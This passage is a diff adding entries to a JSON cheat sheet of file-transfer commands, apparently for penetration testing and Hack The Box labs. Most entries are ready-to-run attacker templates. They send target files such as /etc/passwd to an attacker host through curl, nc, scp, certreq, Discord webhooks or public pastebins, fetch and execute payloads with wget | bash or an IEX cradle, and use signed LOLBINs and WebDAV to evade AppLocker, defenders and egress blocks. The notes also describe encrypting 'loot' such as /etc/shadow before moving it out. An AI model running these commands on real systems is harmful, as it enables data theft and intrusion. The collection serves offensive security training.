+      "notes": "Alternative to base64 when base64 is mangled by the shell or filtered. xxd is on most Linux distros.",
+      "references": [
+        {
+          "label": "xxd man page",
+          "url": "https://linux.die.net/man/1/xxd"
+        }
+      ],
+      "source": "community"
+    },
+    {
+      "id": "linux_curl_post",
+      "label": "curl POST -F (multipart upload)",
+      "command": "curl -X POST http://{ip}:{port}/upload -F 'files=@{filename}'",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "upload",
+        "medium",
+        "srv:http-upload"
+      ],
+      "notes": "Upload to Python uploadserver or any multipart-form endpoint. {filename} is the source path on target (e.g. /etc/passwd).",
+      "ua": "curl/8.x.x",
+      "references": [
+        {
+          "label": "curl uploads \u2014 everything.curl.dev",
+          "url": "https://everything.curl.dev/usingcurl/uploads.html"
+        }
+      ],
+      "usage": "python3 -m uploadserver {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_curl_put",
+      "label": "curl PUT -T (WebDAV upload)",
+      "command": "curl -T {filename} http://{ip}:{port}/SecretUploadDirectory/",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "upload",
+        "medium",
+        "srv:nginx-put"
+      ],
+      "notes": "HTTP PUT upload. Requires server with WebDAV PUT support (e.g. nginx with dav_methods PUT, or wsgidav).",
+      "ua": "curl/8.x.x",
+      "references": [
+        {
+          "label": "curl uploads \u2014 everything.curl.dev",
+          "url": "https://everything.curl.dev/usingcurl/uploads.html"
+        }
+      ],
+      "usage": "# nginx WebDAV PUT recipe \u2014 see srv_nginx_put in Extras",
+      "source": "htb"
+    },
+    {
+      "id": "linux_scp",
+      "label": "scp \u2014 push to attacker",
+      "command": "scp {filename} user@{ip}:/tmp/",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "upload",
+        "stealth",
+        "srv:ssh"
+      ],
+      "notes": "SSH-based encrypted upload. Replace 'user' with the SSH username on your attacker box. Requires SSH server running on port 22 (or pass -P for custom port).",
+      "references": [
+        {
+          "label": "scp man page",
+          "url": "https://man7.org/linux/man-pages/man1/scp.1.html"
+        }
+      ],
+      "usage": "# Ensure attacker SSH server is running:\nsudo systemctl start ssh",
+      "source": "htb"
+    },
+    {
+      "id": "linux_python_upload",
+      "label": "Python 3 \u2014 requests POST upload",
+      "command": "python3 -c 'import requests;requests.post(\"http://{ip}:{port}/upload\",files={\"files\":open(\"{filename}\",\"rb\")})'",
+      "meta": [
+        "cross",
+        "language",
+        "upload",
+        "loud",
+        "srv:http-upload"
+      ],
+      "notes": "Uses the requests module. Falls back nicely when curl is missing but python3 + requests is installed.",
+      "ua": "python-requests/2.x",
+      "references": [
+        {
+          "label": "python-requests docs",
+          "url": "https://requests.readthedocs.io/en/latest/"
+        }
+      ],
+      "usage": "python3 -m uploadserver {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_nc_upload",
+      "label": "nc \u2014 push to attacker",
+      "command": "nc -q 0 {ip} {port} < {filename}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "upload",
+        "stealth",
+        "srv:nc-listen"
+      ],
+      "notes": "Send file from target to attacker via netcat. Attacker side: nc -lvnp {port} > received. -q 0 closes the connection on EOF (use --send-only with ncat instead).",
+      "references": [
+        {
+          "label": "ncat \u2014 Nmap docs",
+          "url": "https://nmap.org/ncat/guide/"
+        }
+      ],
+      "usage": "sudo nc -lvnp {port} > received_file",
+      "when": "Need to push file from target to attacker, no HTTP server available, raw TCP works.",
+      "source": "htb"
+    },
+    {
+      "id": "ps_psupload",
+      "label": "PowerShell \u2014 PSUpload",
+      "command": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'); Invoke-FileUpload -Uri http://{ip}:{port}/upload -File {filename}",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "upload",
+        "loud",
+        "srv:http-upload"
+      ],
+      "notes": "PowerShell has no built-in HTTP upload. PSUpload provides Invoke-FileUpload. Loads the script via IEX cradle. Server side: python3 -m uploadserver",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "references": [
+        {
+          "label": "PSUpload.ps1 \u2014 juliourena",
+          "url": "https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1"
+        }
+      ],
+      "usage": "python3 -m uploadserver {port}",
+      "source": "htb"
+    },
+    {
+      "id": "ps_iwr_put",
+      "label": "PowerShell \u2014 IWR PUT",
+      "command": "Invoke-WebRequest -Uri http://{ip}:{port}/{filename} -Method PUT -InFile {filename} -UseBasicParsing",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "upload",
+        "loud",
+        "srv:nginx-put"
+      ],
+      "notes": "HTTP PUT upload from PowerShell. Server side: nginx with dav_methods PUT, or wsgidav.",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "references": [
+        {
+          "label": "MS Docs \u2014 Invoke-WebRequest",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest"
+        }
+      ],
+      "usage": "# nginx WebDAV PUT recipe \u2014 see srv_nginx_put in Extras",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_certreq",
+      "label": "cmd \u2014 certreq -Post (LOLBIN upload)",
+      "command": "certreq.exe -Post -config http://{ip}:{port}/ {filename}",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "upload",
+        "medium",
+        "srv:nc-listen"
+      ],
+      "notes": "LOLBIN designed for submitting cert requests over HTTP. Expect a 'timed out' response on the target \u2014 there's no CA listening \u2014 but the POST body still reaches your nc listener. Server side: nc -lvnp {port}. UA: 'NDES client' \u2014 looks legitimate.",
+      "ua": "Mozilla/4.0 (compatible; Win32; NDES client 10.0.x)",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Certreq",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Certreq/"
+        }
+      ],
+      "usage": "sudo nc -lvnp {port}",
+      "when": "Windows upload when no other channel works. Microsoft-signed, \"NDES client\" UA looks legit.",
+      "source": "htb"
+    },
+    {
+      "id": "cross_transfer_sh",
+      "label": "transfer.sh (public pastebin)",
+      "command": "curl --upload-file {filename} https://transfer.sh/{filename}",
+      "meta": [
+        "cross",
+        "service",
+        "upload",
+        "medium"
+      ],
+      "notes": "Uploads to public file pastebin. Returns a shareable URL on stdout you can fetch from anywhere. Files expire after ~14 days. Useful when you can't host your own server (egress-limited target).",
+      "ua": "curl/8.x.x",
+      "references": [
+        {
+          "label": "transfer.sh on GitHub",
+          "url": "https://github.com/dutchcoders/transfer.sh"
+        }
+      ],
+      "source": "community"
+    },
+    {
+      "id": "cross_0x0_st",
+      "label": "0x0.st (public pastebin)",
+      "command": "curl -F'file=@{filename}' https://0x0.st",
+      "meta": [
+        "cross",
+        "service",
+        "upload",
+        "medium"
+      ],
+      "notes": "Uploads to public file pastebin. Returns a shareable URL on stdout. Smaller files expire after months, larger files after a year. Anonymous, no signup.",
+      "ua": "curl/8.x.x",
+      "references": [
+        {
+          "label": "0x0.st",
+          "url": "https://0x0.st/"
+        }
+      ],
+      "source": "community"
+    },
+    {
+      "id": "cmd_smb_copy",
+      "label": "cmd \u2014 SMB copy (UNC path)",
+      "command": "copy \\\\{ip}\\share\\{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "download",
+        "stealth",
+        "srv:smb"
+      ],
+      "notes": "Classic SMB file copy via UNC path. Server side: impacket-smbserver. Recent Windows defaults reject anonymous guest SMB \u2014 if you see that error, mount the share with credentials first: net use n: \\\\{ip}\\share /user:test test, then copy n:\\{filename}.",
+      "process": "svchost.exe (LanmanWorkstation)",
+      "references": [
+        {
+          "label": "MS Docs \u2014 net use",
+          "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)"
+        },
+        {
+          "label": "impacket smbserver.py",
+          "url": "https://github.com/fortra/impacket/blob/master/examples/smbserver.py"
+        }
+      ],
+      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "when": "HTTP outbound is blocked but TCP/445 (SMB) works. Often the case in restricted networks.",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_webdav_copy",
+      "label": "cmd \u2014 WebDAV copy (UNC over HTTP)",
+      "command": "copy \\\\{ip}\\DavWWWRoot\\{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "download",
+        "stealth",
+        "srv:webdav"
+      ],
+      "notes": "Looks like SMB but rides over HTTP/80 \u2014 bypasses TCP/445 outbound blocks. Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous. The magic 'DavWWWRoot' path triggers Windows to switch to WebDAV when SMB isn't reachable.",
+      "references": [
+        {
+          "label": "WebDAV RFC 4918",
+          "url": "https://datatracker.ietf.org/doc/html/rfc4918"
+        },
+        {
+          "label": "wsgidav on GitHub",
+          "url": "https://github.com/mar10/wsgidav"
+        }
+      ],
+      "usage": "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous",
+      "when": "TCP/445 (SMB) outbound is BLOCKED but HTTP/80 works \u2014 WebDAV rides over HTTP via UNC paths.",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_ftp_script",
+      "label": "cmd \u2014 FTP command file",
+      "command": "echo open {ip} > ftp.txt\necho USER anonymous >> ftp.txt\necho binary >> ftp.txt\necho GET {filename} >> ftp.txt\necho bye >> ftp.txt\nftp -v -n -s:ftp.txt",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "download",
+        "loud",
+        "srv:ftp"
+      ],
+      "notes": "When only a non-interactive shell is available \u2014 build a script file then run ftp -s:. Always include 'binary' mode for non-text files (ASCII mode mangles binaries). Server side: sudo python3 -m pyftpdlib --port 21.",
+      "ua": "ftp/Windows (no HTTP)",
+      "references": [
+        {
+          "label": "MS Docs \u2014 ftp",
+          "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp"
+        }
+      ],
+      "usage": "sudo python3 -m pyftpdlib --port 21",
+      "source": "htb"
+    },
+    {
+      "id": "win_gfxdownload",
+      "label": "cmd \u2014 GfxDownloadWrapper (Intel LOLBIN)",
+      "command": "GfxDownloadWrapper.exe \"http://{ip}:{port}/{filename}\" \"{win_out}\"",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Intel Graphics Driver utility. Pre-installed on most Intel-based laptops. INTEL-signed (not Microsoft) \u2014 bypasses AppLocker rules that allow only Microsoft. Almost no defender monitors graphics driver utilities.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 GfxDownloadWrapper",
+          "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Gfxdownloadwrapper/"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "when": "AppLocker permits Microsoft-signed binaries but blocks PowerShell. Intel-signed LOLBIN \u2014 almost no defenders monitor it.",
+      "source": "htb"
+    },
+    {
+      "id": "win_esentutl",
+      "label": "cmd \u2014 esentutl /y (SMB LOLBIN)",
+      "command": "esentutl.exe /y \\\\{ip}\\share\\{filename} /d {win_out} /o",
+      "meta": [
+        "windows",
+        "cmd",
+        "lolbin",
+        "download",
+        "stealth",
+        "srv:smb"
+      ],
+      "notes": "Extensible Storage Engine utility abused for SMB copy. Source must be an SMB share, not HTTP. Less monitored than copy/SMB tools. /y = copy, /d = destination, /o = overwrite.",
+      "references": [
+        {
+          "label": "LOLBAS \u2014 Esentutl",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Esentutl/"
+        }
+      ],
+      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "source": "htb"
+    },
+    {
+      "id": "ps_pssession_to",
+      "label": "PowerShell \u2014 PSSession Copy-Item -ToSession",
+      "command": "$s = New-PSSession -ComputerName {ip}\nCopy-Item -Path {filename} -ToSession $s -Destination {win_out}",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "upload",
+        "stealth"
+      ],
+      "notes": "Lateral movement via WinRM (port 5985). Pushes a file from your current host to a remote PSSession. Requires admin on target OR membership in 'Remote Management Users' group. Add -Credential (Get-Credential) for explicit creds.",
+      "references": [
+        {
+          "label": "MS Docs \u2014 Copy-Item",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item"
+        },
+        {
+          "label": "MS Docs \u2014 New-PSSession",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession"
+        }
+      ],
+      "source": "htb"
+    },
+    {
+      "id": "ps_pssession_from",
+      "label": "PowerShell \u2014 PSSession Copy-Item -FromSession",
+      "command": "$s = New-PSSession -ComputerName {ip}\nCopy-Item -Path \"{win_out}\" -Destination {filename} -FromSession $s",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "stealth"
+      ],
+      "notes": "Pull file from remote PSSession (WinRM port 5985) to your local host. Use this for exfilling files from a target you already have a PSSession on. Same auth requirements as -ToSession.",
+      "references": [
+        {
+          "label": "MS Docs \u2014 Copy-Item",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item"
+        }
+      ],
+      "source": "htb"
+    },
+    {
+      "id": "linux_openssl_sclient",
+      "label": "openssl s_client \u2014 TLS file pull",
+      "command": "openssl s_client -connect {ip}:{port} -quiet > {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "lolbin",
+        "download",
+        "stealth",
+        "srv:tls"
+      ],
+      "notes": "TLS-encrypted file transfer. Looks like generic HTTPS on the wire \u2014 no actual HTTP. Server side: openssl s_server -quiet -accept {port} -cert cert.pem -key key.pem < FILE. Pre-generate cert: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj '/CN=server'.",
+      "references": [
+        {
+          "label": "GTFOBins \u2014 openssl",
+          "url": "https://gtfobins.org/gtfobins/openssl/"
+        },
+        {
+          "label": "openssl s_client docs",
+          "url": "https://www.openssl.org/docs/man3.0/man1/openssl-s_client.html"
+        }
+      ],
+      "usage": "openssl s_server -quiet -accept {port} -cert cert.pem -key key.pem < {filename}\n# Generate cert: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj \"/CN=server\"",
+      "source": "htb"
+    },
+    {
+      "id": "cross_discord_webhook",
+      "label": "Discord webhook upload",
+      "command": "curl -F 'file1=@{filename}' https://discord.com/api/webhooks/<WEBHOOK_ID>/<TOKEN>",
+      "meta": [
+        "cross",
+        "service",
+        "upload",
+        "stealth"
+      ],
+      "notes": "Posts file to a Discord channel via webhook. Free, no own infrastructure needed, traffic blends into legit Discord HTTPS. Setup: in Discord, channel settings \u2192 Integrations \u2192 Webhooks \u2192 New Webhook. Replace <WEBHOOK_ID>/<TOKEN> with the URL Discord gives you. Heavily abused by info-stealers.",
+      "references": [
+        {
+          "label": "Discord webhook docs",
+          "url": "https://discord.com/developers/docs/resources/webhook"
+        },
+        {
+          "label": "MITRE T1567.004 \u2014 Webhook exfil",
+          "url": "https://attack.mitre.org/techniques/T1567/004/"
+        }
+      ],
+      "source": "community"
+    },
+    {
+      "id": "ps_webclient_async",
+      "label": "PowerShell \u2014 Net.WebClient.DownloadFileAsync",
+      "command": "(New-Object Net.WebClient).DownloadFileAsync('http://{ip}:{port}/{filename}', '{win_out}')",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "loud",
+        "srv:http"
+      ],
+      "notes": "Non-blocking variant of DownloadFile \u2014 returns immediately and downloads in background. Useful for large files or starting parallel transfers without waiting.",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "references": [
+        {
+          "label": "MS Docs \u2014 DownloadFileAsync",
+          "url": "https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "ps_ftp_download",
+      "label": "PowerShell \u2014 Net.WebClient FTP download",
+      "command": "(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{win_out}')",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "download",
+        "medium",
+        "srv:ftp"
+      ],
+      "notes": "PowerShell-native FTP via WebClient \u2014 no need for ftp.exe. Anonymous by default. For credentials: `$wc = New-Object Net.WebClient; $wc.Credentials = New-Object System.Net.NetworkCredential('user','pass'); $wc.DownloadFile(...)`. FTP control on TCP/21 is often blocked outbound \u2014 test reachability first.",
+      "references": [
+        {
+          "label": "MS Docs \u2014 Net.WebClient",
+          "url": "https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient"
+        }
+      ],
+      "usage": "sudo python3 -m pyftpdlib --port 21",
+      "source": "htb"
+    },
+    {
+      "id": "ps_ftp_upload",
+      "label": "PowerShell \u2014 Net.WebClient FTP upload",
+      "command": "(New-Object Net.WebClient).UploadFile('ftp://{ip}/{filename}', '{filename}')",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "upload",
+        "medium",
+        "srv:ftp-write"
+      ],
+      "notes": "Push local file to FTP server. First arg = remote URI (filename to write on server), second arg = local source path. Server side: sudo python3 -m pyftpdlib --port 21 --write (allow anonymous writes).",
+      "references": [
+        {
+          "label": "MS Docs \u2014 UploadFile",
+          "url": "https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadfile"
+        }
+      ],
+      "usage": "sudo python3 -m pyftpdlib --port 21 --write",
+      "source": "htb"
+    },
+    {
+      "id": "ps_base64_nc_upload",
+      "label": "PowerShell \u2014 base64 + IWR POST to nc",
+      "command": "$b64 = [Convert]::ToBase64String((Get-Content -Path '{filename}' -Encoding Byte))\nInvoke-WebRequest -Uri http://{ip}:{port}/ -Method POST -Body $b64",
+      "meta": [
+        "windows",
+        "powershell",
+        "tool",
+        "upload",
+        "loud",
+        "srv:nc-listen"
+      ],
+      "notes": "Scrappy upload when no real server is available \u2014 POST base64-encoded file to a netcat listener. Attacker side: `nc -lvnp {port}` then decode with `echo <PASTE> | base64 -d > out`. Use -Encoding Byte for binary integrity.",
+      "ua": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x",
+      "references": [],
+      "usage": "sudo nc -lvnp {port}\n# Then decode the captured base64:\n# echo \"<PASTE_BODY>\" | base64 -d > out",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_smb_upload",
+      "label": "cmd \u2014 SMB upload (UNC path)",
+      "command": "copy {filename} \\\\{ip}\\share\\",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "upload",
+        "stealth",
+        "srv:smb"
+      ],
+      "notes": "Push file from target to attacker SMB share. Server side: sudo impacket-smbserver share -smb2support /tmp/smbshare. With auth: net use n: \\\\{ip}\\share /user:test test, then copy {filename} n:\\.",
+      "references": [
+        {
+          "label": "impacket smbserver",
+          "url": "https://github.com/fortra/impacket/blob/master/examples/smbserver.py"
+        }
+      ],
+      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_webdav_upload",
+      "label": "cmd \u2014 WebDAV upload (UNC over HTTP)",
+      "command": "copy {filename} \\\\{ip}\\DavWWWRoot\\",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "upload",
+        "stealth",
+        "srv:webdav"
+      ],
+      "notes": "Upload via WebDAV \u2014 looks like SMB but rides over HTTP/80. Bypasses TCP/445 outbound blocks. Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous (mark share as Read-Write).",
+      "references": [
+        {
+          "label": "WebDAV RFC 4918",
+          "url": "https://datatracker.ietf.org/doc/html/rfc4918"
+        }
+      ],
+      "usage": "sudo wsgidav --host=0.0.0.0 --port={port} --root=/tmp --auth=anonymous",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_ftp_script_upload",
+      "label": "cmd \u2014 FTP command file (PUT)",
+      "command": "echo open {ip} > ftp.txt\necho USER anonymous >> ftp.txt\necho binary >> ftp.txt\necho PUT {filename} >> ftp.txt\necho bye >> ftp.txt\nftp -v -n -s:ftp.txt",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "upload",
+        "loud",
+        "srv:ftp-write"
+      ],
+      "notes": "Upload variant of the FTP script \u2014 same structure with PUT instead of GET. Always include 'binary' to avoid ASCII-mode mangling. Server side: sudo python3 -m pyftpdlib --port 21 --write.",
+      "ua": "ftp/Windows (no HTTP)",
+      "references": [
+        {
+          "label": "MS Docs \u2014 ftp",
+          "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp"
+        }
+      ],
+      "usage": "sudo python3 -m pyftpdlib --port 21 --write",
+      "source": "htb"
+    },
+    {
+      "id": "cmd_smb_copy_auth",
+      "label": "cmd \u2014 SMB copy with auth (net use)",
+      "command": "net use n: \\\\{ip}\\share /user:test test\ncopy n:\\{filename} {win_out}",
+      "meta": [
+        "windows",
+        "cmd",
+        "tool",
+        "download",
+        "stealth",
+        "srv:smb-auth"
+      ],
+      "notes": "Modern Windows blocks unauthenticated guest SMB. Mount with explicit credentials first, then copy. Server side: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test. Drive letter 'n:' is arbitrary.",
+      "references": [
+        {
+          "label": "MS Docs \u2014 net use",
+          "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)"
+        }
+      ],
+      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test",
+      "when": "SMB works but modern Windows refuses anonymous guest access. Server needs auth credentials.",
+      "source": "htb"
+    },
+    {
+      "id": "linux_scp_download",
+      "label": "scp \u2014 pull from attacker",
+      "command": "scp user@{ip}:/path/{filename} {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "stealth",
+        "srv:ssh"
+      ],
+      "notes": "Pull file from attacker SSH server to target. Encrypted, authenticated, perms preserved. Replace 'user' with your SSH username. For non-default port: scp -P PORT user@host:/path file. SSH outbound (TCP/22) is usually allowed.",
+      "references": [
+        {
+          "label": "OpenSSH scp",
+          "url": "https://man.openbsd.org/scp"
+        }
+      ],
+      "usage": "# Ensure attacker SSH server is running:\nsudo systemctl start ssh",
+      "source": "htb"
+    },
+    {
+      "id": "linux_wget_fileless",
+      "label": "wget -qO- | bash (fileless)",
+      "command": "wget -qO- http://{ip}:{port}/{filename} | bash",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "fileless",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "wget version of curl|bash. -q quiet, -O- output to stdout, then pipe to bash (or python3, etc.) for fileless execution. Caveat: payloads using mkfifo still create temp files on disk.",
+      "ua": "Wget/1.21.x",
+      "references": [],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_php_fopen",
+      "label": "PHP \u2014 fopen streaming download",
+      "command": "php -r 'const BUFFER = 1024; $fr = fopen(\"http://{ip}:{port}/{filename}\", \"rb\"); $fl = fopen(\"{nix_out}\", \"wb\"); while ($b = fread($fr, BUFFER)) { fwrite($fl, $b); } fclose($fl); fclose($fr);'",
+      "meta": [
+        "linux",
+        "language",
+        "tool",
+        "download",
+        "medium",
+        "srv:http"
+      ],
+      "notes": "Streaming download \u2014 reads in 1KB chunks instead of loading whole file into memory like file_get_contents(). Use this for large files. Requires PHP fopen URL wrappers enabled (default on most installs).",
+      "references": [
+        {
+          "label": "PHP fopen()",
+          "url": "https://www.php.net/manual/en/function.fopen.php"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_perl_socket",
+      "label": "Perl \u2014 IO::Socket::INET (raw)",
+      "command": "perl -e 'use IO::Socket::INET; $s=IO::Socket::INET->new(\"{ip}:{port}\"); print $s \"GET /{filename} HTTP/1.0\\r\\nHost: {ip}\\r\\n\\r\\n\"; while(<$s>){print}' > {nix_out}\nsed -i '1,/^\\r\\?$/d' {nix_out}",
+      "meta": [
+        "linux",
+        "language",
+        "tool",
+        "download",
+        "stealth",
+        "srv:http"
+      ],
+      "notes": "Raw socket fallback \u2014 use when LWP::Simple isn't installed (minimal perl-base systems). Builds the HTTP GET manually. sed strips response headers.",
+      "references": [
+        {
+          "label": "Perl IO::Socket::INET",
+          "url": "https://perldoc.perl.org/IO::Socket::INET"
+        }
+      ],
+      "usage": "python3 -m http.server {port}",
+      "source": "community"
+    },
+    {
+      "id": "linux_nc_listen_download",
+      "label": "nc listen \u2014 receive from attacker",
+      "command": "nc -l -p {port} > {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "stealth",
+        "srv:nc-pull"
+      ],
+      "notes": "Target listens, attacker pushes the file. Use when target is reachable inbound (CTF labs, exposed services). Attacker side: nc -q 0 {ip} {port} < {filename} (or with ncat: ncat --send-only {ip} {port} < {filename}).",
+      "references": [
+        {
+          "label": "Ncat",
+          "url": "https://nmap.org/ncat/"
+        }
+      ],
+      "usage": "# Attacker pushes file to listening target:\nnc -q 0 {ip} {port} < {filename}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_xfreerdp_drive",
+      "label": "xfreerdp \u2014 RDP drive mount",
+      "command": "xfreerdp /v:{ip} /u:administrator /p:'PASSWORD' /drive:share,/path/to/share",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "upload",
+        "stealth"
+      ],
+      "notes": "Mount a local Linux folder into the RDP session. Inside Windows, access via \\\\tsclient\\share \u2014 drag files in either direction. Caveat: Defender on YOUR side may delete malware in the shared dir.",
+      "references": [
+        {
+          "label": "xfreerdp man page",
+          "url": "https://www.freerdp.com/"
+        }
+      ],
+      "source": "htb"
+    },
+    {
+      "id": "linux_rdesktop_disk",
+      "label": "rdesktop \u2014 RDP disk mount",
+      "command": "rdesktop {ip} -d HTB -u administrator -p 'PASSWORD' -r disk:share=/path/to/share",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "upload",
+        "stealth"
+      ],
+      "notes": "Older alternative to xfreerdp. Same \\\\tsclient\\share pattern inside the RDP session for bidirectional file transfer.",
+      "references": [
+        {
+          "label": "rdesktop",
+          "url": "http://www.rdesktop.org/"
+        }
+      ],
+      "source": "htb"
+    },
+    {
+      "id": "linux_devtcp_raw",
+      "label": "bash /dev/tcp \u2014 raw TCP receive",
+      "command": "cat < /dev/tcp/{ip}/{port} > {nix_out}",
+      "meta": [
+        "linux",
+        "bash",
+        "tool",
+        "download",
+        "stealth",
+        "srv:nc-send"
+      ],
+      "notes": "Raw bash TCP client \u2014 no HTTP, just bytes. Pairs with a netcat sender on attacker (nc -l -p {port} -q 0 < {filename}). Use when target has no nc but bash 2.04+ is present. Different from /dev/tcp HTTP form (which builds a GET request).",
+      "references": [
+        {
+          "label": "Bash /dev/tcp",
+          "url": "https://tldp.org/LDP/abs/html/devref1.html"
+        }
+      ],
+      "usage": "sudo nc -l -p {port} -q 0 < {filename}",
+      "source": "htb"
+    },
+    {
+      "id": "linux_openssl_encrypt",
+      "label": "openssl \u2014 AES-256 encrypt",
+      "command": "openssl enc -aes256 -iter 100000 -pbkdf2 -in {filename} -out {filename}.enc",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "encrypt",
+        "stealth",
+        "srv:client-pair"
+      ],
+      "notes": "Encrypt before transfer over plaintext channels (HTTP/FTP/nc). CRITICAL: always include -pbkdf2 \u2014 without it, openssl uses single-round MD5 derivation (trivially brute-forceable). Use -iter 100000 to slow down attackers further. Use a unique strong password per engagement.",
+      "references": [
+        {
+          "label": "openssl enc man page",
+          "url": "https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html"
+        }
+      ],
+      "usage": "openssl enc -d -aes256 -iter 100000 -pbkdf2 -in {filename}.enc -out {filename}",
+      "when": "Loot is sensitive (creds, NTDS, /etc/shadow). Encrypt before transferring over plaintext channels.",
+      "source": "htb"
+    },
+    {
+      "id": "linux_openssl_decrypt",
+      "label": "openssl \u2014 AES-256 decrypt",
+      "command": "openssl enc -d -aes256 -iter 100000 -pbkdf2 -in {filename}.enc -out {filename}",
+      "meta": [
+        "linux",
+        "bash",
+        "extras",
+        "encrypt",
+        "stealth",
+        "srv:client-pair"
+      ],
+      "notes": "Counterpart to encrypt. Same flags must match (-aes256, -iter, -pbkdf2). After decrypt + verify, shred the encrypted artifact: shred -u {filename}.enc.",
+      "references": [
+        {
+          "label": "openssl enc man page",
+          "url": "https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html"
+        }
+      ],
+      "usage": "openssl enc -aes256 -iter 100000 -pbkdf2 -in {filename} -out {filename}.enc",
+      "source": "htb"
+    },
+    {
+      "id": "ps_aes_encrypt",
+      "label": "PowerShell \u2014 Invoke-AESEncryption encrypt",
+      "command": "Import-Module .\\Invoke-AESEncryption.ps1\nInvoke-AESEncryption -Mode Encrypt -Key 'CHANGE_ME' -Path .\\{filename}",
+      "meta": [
+        "windows",
+        "powershell",
+        "extras",
+        "encrypt",
+        "stealth",
+        "srv:client-pair"
+      ],
+      "notes": "AES-256-CBC. Output file gets .aes extension. Download Invoke-AESEncryption.ps1 to target first. Key derivation = SHA-256 of UTF-8 password. Use unique strong keys per engagement to limit blast radius if a key leaks.",
+      "references": [
+        {
+          "label": "Invoke-AESEncryption.ps1",
+          "url": "https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1"
+        }
+      ],
